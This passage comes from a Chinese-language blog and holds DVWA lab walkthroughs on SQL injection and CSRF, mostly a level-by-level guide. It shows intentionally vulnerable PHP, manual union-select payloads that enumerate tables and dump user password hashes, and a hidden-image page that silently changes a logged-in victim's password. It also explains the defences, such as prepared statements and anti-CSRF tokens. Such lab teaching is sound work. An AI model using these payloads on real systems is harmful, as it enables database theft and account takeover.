class="line">            &#x2F;&#x2F; Feedback for end user </span><br><span class="line">            echo &#39;&lt;pre&gt;User ID exists in the database.&lt;&#x2F;pre&gt;&#39;; </span><br><span class="line">        &#125; </span><br><span class="line">        else &#123; </span><br><span class="line">            &#x2F;&#x2F; User wasn&#39;t found, so the page wasn&#39;t! </span><br><span class="line">            header( $_SERVER[ &#39;SERVER_PROTOCOL&#39; ] . &#39; 404 Not Found&#39; ); </span><br><span class="line"></span><br><span class="line">            &#x2F;&#x2F; Feedback for end user </span><br><span class="line">            echo &#39;&lt;pre&gt;User ID is MISSING from the database.&lt;&#x2F;pre&gt;&#39;; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Generate Anti-CSRF token </span><br><span class="line">generateSessionToken(); </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>可以看到，Impossible级别的代码采用了PDO技术，划清了代码与数据的界限，有效防御SQL注入，Anti-CSRF token机制的加入了进一步提高了安全性。</p>

      
      <!-- 打赏 -->
      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/01/09/SQL%20Injection(Blind)/" data-id="ck56chf940001fcvogprlge6g"
        class="article-share-link">分享</a>
      
    </footer>

  </div>

  

  
  
  

  

</article>
    
    <article id="post-SQL Injection" class="article article-type-post" itemscope
  itemprop="blogPost" data-scroll-reveal>

  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2020/01/09/SQL%20Injection/"
    >SQL Injection</a
  >
</h2>
  

    </header>
    

    
    <div class="article-meta">
      <a href="/2020/01/09/SQL%20Injection/" class="article-date">
  <time datetime="2020-01-09T01:56:06.972Z" itemprop="datePublished">2020-01-09</time>
</a>
      
    </div>
    

    

    <div class="article-entry" itemprop="articleBody">
      


      

      
      <h1 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h1><p>自动化的注入神器sqlmap固然好用，但还是要掌握一些手工注入的思路，下面简要介绍手工注入（非盲注）的步骤。</p>
<p>1.判断是否存在注入，注入是字符型还是数字型</p>
<p>2.猜解SQL查询语句中的字段数</p>
<p>3.确定显示的字段顺序</p>
<p>4.获取当前数据库</p>
<p>5.获取数据库中的表</p>
<p>6.获取表中的字段名</p>
<p>7.下载数据</p>
<p>下面对四种级别的代码进行分析。</p>
<h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><p>服务端核心代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">if( isset( $_REQUEST[ &#39;Submit&#39; ] ) ) &#123; </span><br><span class="line">    &#x2F;&#x2F; Get input </span><br><span class="line">    $id &#x3D; $_REQUEST[ &#39;id&#39; ]; </span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Check database </span><br><span class="line">    $query  &#x3D; &quot;SELECT first_name, last_name FROM users WHERE user_id &#x3D; &#39;$id&#39;;&quot;; </span><br><span class="line">    $result &#x3D; mysql_query( $query ) or die( &#39;&lt;pre&gt;&#39; . mysql_error() . &#39;&lt;&#x2F;pre&gt;&#39; ); </span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Get results </span><br><span class="line">    $num &#x3D; mysql_numrows( $result ); </span><br><span class="line">    $i   &#x3D; 0; </span><br><span class="line">    while( $i &lt; $num ) &#123; </span><br><span class="line">        &#x2F;&#x2F; Get values </span><br><span class="line">        $first &#x3D; mysql_result( $result, $i, &quot;first_name&quot; ); </span><br><span class="line">        $last  &#x3D; mysql_result( $result, $i, &quot;last_name&quot; ); </span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; Feedback for end user </span><br><span class="line">        echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br &#x2F;&gt;First name: &#123;$first&#125;&lt;br &#x2F;&gt;Surname: &#123;$last&#125;&lt;&#x2F;pre&gt;&quot;; </span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; Increase loop count </span><br><span class="line">        $i++; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    mysql_close(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>可以看到，Low级别的代码对来自客户端的参数id没有进行任何的检查与过滤，存在明显的SQL注入。</p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>现实攻击场景下，攻击者是无法看到后端代码的，所以下面的手工注入步骤是建立在无法看到源码的基础上。</p>
<h3 id="1-判断是否存在注入，注入是字符型还是数字型"><a href="#1-判断是否存在注入，注入是字符型还是数字型" class="headerlink" title="1.判断是否存在注入，注入是字符型还是数字型"></a>1.判断是否存在注入，注入是字符型还是数字型</h3><p>输入1，查询成功：</p>
<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/SQL%20In/1.PNG" alt=""></p>
<p>输入1’ and ‘1’ =’2,查询失败，返回结果为空：</p>
<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/SQL%20In/2.PNG" alt=""></p>
<p>输入1’ or ‘1234 ‘=’1234,查询成功：</p>
<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/SQL%20In/3.PNG" alt=""></p>
<p>返回多个结果，说明存在字符型注入。</p>
<h3 id="2-猜解SQL查询语句中的字段数"><a href="#2-猜解SQL查询语句中的字段数" class="headerlink" title="2.猜解SQL查询语句中的字段数"></a>2.猜解SQL查询语句中的字段数</h3><p>输入1’ or 1=1 order by 1 #,查询成功：</p>
<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/SQL%20In/4.PNG" alt=""></p>
<p>输入1’ or 1=1 order by 2 #，查询成功：</p>
<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/SQL%20In/5.PNG" alt=""></p>
<p>输入1’ or 1=1 order by 3 #，查询失败：</p>
<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/SQL%20In/6.PNG" alt=""></p>
<p>说明执行的SQL查询语句中只有两个字段，即这里的First name、Surname。</p>
<p>（这里也可以通过输入union select 1,2,3…来猜解字段数）</p>
<h2 id="3-确定显示的字段顺序"><a href="#3-确定显示的字段顺序" class="headerlink" title="3.确定显示的字段顺序"></a>3.确定显示的字段顺序</h2><p>输入1’ union select 1,2 #，查询成功：</p>
<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/SQL%20In/7.PNG" alt=""></p>
<h3 id="4-获取当前数据库"><a href="#4-获取当前数据库" class="headerlink" title="4.获取当前数据库"></a>4.获取当前数据库</h3><p>输入1’ union select 1,database() #，查询成功：</p>
<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/SQL%20In/8.PNG" alt=""></p>
<p>说明当前的数据库为dvwa。</p>
<h3 id="5-获取数据库的表"><a href="#5-获取数据库的表" class="headerlink" title="5.获取数据库的表"></a>5.获取数据库的表</h3><p>输入1’ union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #，查询成功：</p>
<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/SQL%20In/9.PNG" alt=""></p>
<p>说明数据库dvwa中一共有两个表，guestbook与users。</p>
<h3 id="6-获取表中的字段名"><a href="#6-获取表中的字段名" class="headerlink" title="6.获取表中的字段名"></a>6.获取表中的字段名</h3><p>输入1’ union select 1,group_concat(column_name) from information_schema.columns where table_name=’users’ #，查询成功：</p>
<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/SQL%20In/10.PNG" alt=""></p>
<p>说明users表中有8个字段，分别是user_id,first_name,last_name,user,password,avatar,last_login,failed_login。</p>
<h3 id="7-下载数据"><a href="#7-下载数据" class="headerlink" title="7.下载数据"></a>7.下载数据</h3><p>输入1’ or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #，查询成功：</p>
<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/SQL%20In/11.PNG" alt=""></p>
<p>这样就得到了users表中所有用户的user_id,first_name,last_name,password的数据。</p>
<h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><p>服务器端核心代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &#39;Submit&#39; ] ) ) &#123; </span><br><span class="line">    &#x2F;&#x2F; Get input </span><br><span class="line">    $id &#x3D; $_POST[ &#39;id&#39; ]; </span><br><span class="line">    $id &#x3D; mysql_real_escape_string( $id ); </span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Check database </span><br><span class="line">    $query  &#x3D; &quot;SELECT first_name, last_name FROM users WHERE user_id &#x3D; $id;&quot;; </span><br><span class="line">    $result &#x3D; mysql_query( $query ) or die( &#39;&lt;pre&gt;&#39; . mysql_error() . &#39;&lt;&#x2F;pre&gt;&#39; ); </span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Get results </span><br><span class="line">    $num &#x3D; mysql_numrows( $result ); </span><br><span class="line">    $i   &#x3D; 0; </span><br><span class="line">    while( $i &lt; $num ) &#123; </span><br><span class="line">        &#x2F;&#x2F; Display values </span><br><span class="line">        $first &#x3D; mysql_result( $result, $i, &quot;first_name&quot; ); </span><br><span class="line">        $last  &#x3D; mysql_result( $result, $i, &quot;last_name&quot; ); </span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; Feedback for end user </span><br><span class="line">        echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br &#x2F;&gt;First name: &#123;$first&#125;&lt;br &#x2F;&gt;Surname: &#123;$last&#125;&lt;&#x2F;pre&gt;&quot;; </span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; Increase loop count </span><br><span class="line">        $i++; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;mysql_close(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>可以看到，Medium级别的代码利用mysql_real_escape_string函数对特殊符号</p>
<p>\x00,\n,\r,,’,”,\x1a进行转义，同时前端页面设置了下拉选择表单，希望以此来控制用户的输入。如下图所示：</p>
<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/SQL%20In/12.PNG" alt=""></p>
<h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>虽然前端使用了下拉选择菜单，但我们依然可以通过抓包改参数，提交恶意构造的查询参数。</p>
<h3 id="1-判断是否存在注入，注入是字符型还是数字型-1"><a href="#1-判断是否存在注入，注入是字符型还是数字型-1" class="headerlink" title="1.判断是否存在注入，注入是字符型还是数字型"></a>1.判断是否存在注入，注入是字符型还是数字型</h3><p>抓包更改参数id为1 or 1=1 #，查询成功：</p>
<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/SQL%20In/13.PNG" alt=""></p>
<p>说明存在数字型注入。</p>
<p>（由于是数字型注入，服务器端的mysql_real_escape_string函数就形同虚设了，因为数字型注入并不需要借助引号。）</p>
<h3 id="2-猜解SQL查询语句中的字段数-1"><a href="#2-猜解SQL查询语句中的字段数-1" class="headerlink" title="2.猜解SQL查询语句中的字段数"></a>2.猜解SQL查询语句中的字段数</h3><p>抓包更改参数id为1 order by 2 #，查询成功：</p>
<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/SQL%20In/14.PNG" alt=""></p>
<p>抓包更改参数id为1 order by 3 #，报错如下图所示：</p>
<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/SQL%20In/15.PNG" alt=""></p>
<p>说明执行的SQL查询语句中只有两个字段，即这里的First name、Surname。</p>
<h3 id="3-确定显示的字段顺序-1"><a href="#3-确定显示的字段顺序-1" class="headerlink" title="3.确定显示的字段顺序"></a>3.确定显示的字段顺序</h3><p>抓包更改参数id为1 union select 1,2 #，查询成功：</p>
<p><img src="Ehttps://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/SQL%20In/16.PNG" alt=""></p>
<p>说明执行的SQL语句为select First name,Surname from 表 where ID=id…</p>
<h3 id="4-获取当前数据库-1"><a href="#4-获取当前数据库-1" class="headerlink" title="4.获取当前数据库"></a>4.获取当前数据库</h3><p>抓包更改参数id为1 union select 1,database() #，查询成功：</p>
<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/SQL%20In/17.PNG" alt=""></p>
<p>说明当前的数据库为dvwa。</p>
<h3 id="5-获取数据库中的表"><a href="#5-获取数据库中的表" class="headerlink" title="5.获取数据库中的表"></a>5.获取数据库中的表</h3><p>抓包更改参数id为1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #，查询成功：</p>
<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/SQL%20In/18.PNG" alt=""></p>
<p>说明数据库dvwa中一共有两个表，guestbook与users。</p>
<h3 id="6-获取表中的字段名-1"><a href="#6-获取表中的字段名-1" class="headerlink" title="6.获取表中的字段名"></a>6.获取表中的字段名</h3><p>抓包更改参数id为1 union select 1,group_concat(column_name) from information_schema.columns where table_name=’users’#，查询失败：</p>
<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/SQL%20In/19.PNG" alt=""></p>
<p>这是因为单引号被转义了，变成了\’。</p>
<p>可以利用16进制进行绕过，抓包更改参数id为1 union select 1,group_concat(column_name) from information_schema.columns where table_name=0×7573657273 #，查询成功：</p>
<p><img src="Ehttps://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/SQL%20In/20.PNG" alt=""></p>
<p>说明users表中有8个字段，分别是user_id,first_name,last_name,user,password,avatar,last_login,failed_login。</p>
<h3 id="7-下载数据-1"><a href="#7-下载数据-1" class="headerlink" title="7.下载数据"></a>7.下载数据</h3><p>抓包修改参数id为1 or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #，查询成功：</p>
<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/SQL%20In/21.PNG" alt=""></p>
<p>这样就得到了users表中所有用户的user_id,first_name,last_name,password的数据。</p>
<h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><p>服务器端核心代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">if( isset( $_SESSION [ &#39;id&#39; ] ) ) &#123; </span><br><span class="line">    &#x2F;&#x2F; Get input </span><br><span class="line">    $id &#x3D; $_SESSION[ &#39;id&#39; ]; </span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Check database </span><br><span class="line">    $query  &#x3D; &quot;SELECT first_name, last_name FROM users WHERE user_id &#x3D; $id LIMIT 1;&quot;; </span><br><span class="line">    $result &#x3D; mysql_query( $query ) or die( &#39;&lt;pre&gt;Something went wrong.&lt;&#x2F;pre&gt;&#39; ); </span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Get results </span><br><span class="line">    $num &#x3D; mysql_numrows( $result ); </span><br><span class="line">    $i   &#x3D; 0; </span><br><span class="line">    while( $i &lt; $num ) &#123; </span><br><span class="line">        &#x2F;&#x2F; Get values </span><br><span class="line">        $first &#x3D; mysql_result( $result, $i, &quot;first_name&quot; ); </span><br><span class="line">        $last  &#x3D; mysql_result( $result, $i, &quot;last_name&quot; ); </span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; Feedback for end user </span><br><span class="line">        echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br &#x2F;&gt;First name: &#123;$first&#125;&lt;br &#x2F;&gt;Surname: &#123;$last&#125;&lt;&#x2F;pre&gt;&quot;; </span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; Increase loop count </span><br><span class="line">        $i++; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    mysql_close(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>可以看到，与Medium级别的代码相比，High级别的只是在SQL查询语句中添加了LIMIT 1，希望以此控制只输出一个结果。</p>
<h3 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>虽然添加了LIMIT 1，但是我们可以通过#将其注释掉。由于手工注入的过程与Low级别基本一样，直接最后一步演示下载数据。</p>
<p>输入1 or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #，查询成功：</p>
<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/SQL%20In/22.PNG" alt=""></p>
<h2 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h2><p>服务器端核心代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">if( isset( $_GET[ &#39;Submit&#39; ] ) ) &#123; </span><br><span class="line">    &#x2F;&#x2F; Check Anti-CSRF token </span><br><span class="line">    checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; ); </span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Get input </span><br><span class="line">    $id &#x3D; $_GET[ &#39;id&#39; ]; </span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Was a number entered? </span><br><span class="line">    if(is_numeric( $id )) &#123; </span><br><span class="line">        &#x2F;&#x2F; Check the database </span><br><span class="line">        $data &#x3D; $db-&gt;prepare( &#39;SELECT first_name, last_name FROM users WHERE user_id &#x3D; (:id) LIMIT 1;&#39; ); </span><br><span class="line">        $data-&gt;bindParam( &#39;:id&#39;, $id, PDO::PARAM_INT ); </span><br><span class="line">        $data-&gt;execute(); </span><br><span class="line">        $row &#x3D; $data-&gt;fetch(); </span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; Make sure only 1 result is returned </span><br><span class="line">        if( $data-&gt;rowCount() &#x3D;&#x3D; 1 ) &#123; </span><br><span class="line">            &#x2F;&#x2F; Get values </span><br><span class="line">            $first &#x3D; $row[ &#39;first_name&#39; ]; </span><br><span class="line">            $last  &#x3D; $row[ &#39;last_name&#39; ]; </span><br><span class="line"></span><br><span class="line">            &#x2F;&#x2F; Feedback for end user </span><br><span class="line">            echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br &#x2F;&gt;First name: &#123;$first&#125;&lt;br &#x2F;&gt;Surname: &#123;$last&#125;&lt;&#x2F;pre&gt;&quot;; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Generate Anti-CSRF token </span><br><span class="line">generateSessionToken(); </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>可以看到，Impossible级别的代码采用了PDO技术，划清了代码与数据的界限，有效防御SQL注入，同时只有返回的查询结果数量为一时，才会成功输出，这样就有效预防了“脱裤”，Anti-CSRFtoken机制的加入了进一步提高了安全性。</p>

      
      <!-- 打赏 -->
      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/01/09/SQL%20Injection/" data-id="ck56chf0n0000fcvo8znyc0yx"
        class="article-share-link">分享</a>
      
    </footer>

  </div>

  

  
  
  

  

</article>
    
    <article id="post-CSRF" class="article article-type-post" itemscope
  itemprop="blogPost" data-scroll-reveal>

  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2020/01/03/CSRF/"
    >CSRF</a
  >
</h2>
  

    </header>
    

    
    <div class="article-meta">
      <a href="/2020/01/03/CSRF/" class="article-date">
  <time datetime="2020-01-03T02:55:59.658Z" itemprop="datePublished">2020-01-03</time>
</a>
      
    </div>
    

    

    <div class="article-entry" itemprop="articleBody">
      


      

      
      <h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><p>CSRF，全称Cross-site request forgery，翻译过来就是跨站请求伪造，是指利用受害者尚未失效的身份认证信息（cookie、会话等），诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害人不知情的情况下以受害者的身份向（身份认证信息所对应的）服务器发送请求，从而完成非法操作（如转账、改密等）。</p>
<h2 id="一-low"><a href="#一-low" class="headerlink" title="一.low"></a>一.low</h2><p>先查看一下核心代码。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">CSRF Source</span><br><span class="line">vulnerabilities&#x2F;csrf&#x2F;source&#x2F;low.php</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_GET[ &#39;Change&#39; ] ) ) &#123;</span><br><span class="line">    &#x2F;&#x2F; Get input</span><br><span class="line">    $pass_new  &#x3D; $_GET[ &#39;password_new&#39; ];</span><br><span class="line">    $pass_conf &#x3D; $_GET[ &#39;password_conf&#39; ];</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Do the passwords match?</span><br><span class="line">    if( $pass_new &#x3D;&#x3D; $pass_conf ) &#123;</span><br><span class="line">        &#x2F;&#x2F; They do!</span><br><span class="line">        $pass_new &#x3D; ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line">        $pass_new &#x3D; md5( $pass_new );</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; Update the database</span><br><span class="line">        $insert &#x3D; &quot;UPDATE &#96;users&#96; SET password &#x3D; &#39;$pass_new&#39; WHERE user &#x3D; &#39;&quot; . dvwaCurrentUser() . &quot;&#39;;&quot;;</span><br><span class="line">        $result &#x3D; mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res &#x3D; mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;&#x2F;pre&gt;&#39; );</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; Feedback for the user</span><br><span class="line">        echo &quot;&lt;pre&gt;Password Changed.&lt;&#x2F;pre&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        &#x2F;&#x2F; Issue with passwords matching</span><br><span class="line">        echo &quot;&lt;pre&gt;Passwords did not match.&lt;&#x2F;pre&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res &#x3D; mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>可以看到，服务器收到修改密码的请求后，会检查参数password_new与password_conf是否相同，如果相同，就会修改密码，并没有任何的防CSRF机制。</p>
<p>这里我们采用构造链接的方式来更改密码。</p>
<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/CSRF/1.png" alt=""></p>
<p>可以看到，我们这里的密码都是kali,所以更改成功，现在我们直接修改这里的password_new和password_conf为password，然后访问DVWA。</p>
<p>访问之后，会显示密码修改成功。</p>
<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/CSRF/2.png" alt=""></p>
<p>原来的密码kali已经登陆不上了。</p>
<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/CSRF/3.png" alt=""></p>
<p>使用密码password成功登陆。</p>
<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/CSRF/4.png" alt=""></p>
<p>需要注意的是，CSRF最关键的是利用受害者的cookie向服务器发送伪造请求，所以如果受害者之前用Chrome浏览器登录的这个系统，而用搜狗浏览器点击这个链接，攻击是不会触发的，因为搜狗浏览器并不能利用Chrome浏览器的cookie，所以会自动跳转到登录界面。</p>
<p>在真实情况下，这种连接一眼就会被识破，因此，我们需要仿造一个攻击页面，一方面要隐藏修改密码的地址，另一方面要修改更改密码成功的页面。</p>
<p>这里，我们写一个测试的脚本页面test.html,具体代码如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src&#x3D;&quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;DVWA&#x2F;vulnerabilities&#x2F;csrf&#x2F;?password_new&#x3D;123456&amp;password_conf&#x3D;123456&amp;Change&#x3D;Change#&quot; border&#x3D;&quot;0&quot; style&#x3D;&quot;display:none;&quot;&#x2F;&gt;</span><br><span class="line">&lt;h1&gt;404&lt;h1&gt;</span><br><span class="line">&lt;h2&gt;file not found.&lt;h2&gt;</span><br></pre></td></tr></table></figure>

<p>这里将密码修改成了123456，访问改攻击页面后出现如下网页。</p>
<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/CSRF/5.png" alt=""></p>
<p>但实际上密码已经被我们修改了，原来的密码password已经登陆不上了。</p>
<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/CSRF/6.png" alt=""></p>
<p>用123456成功登陆。</p>
<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/CSRF/7.png" alt=""></p>
<h2 id="二-medium"><a href="#二-medium" class="headerlink" title="二.medium"></a>二.medium</h2><p>首先审计代码。</p>
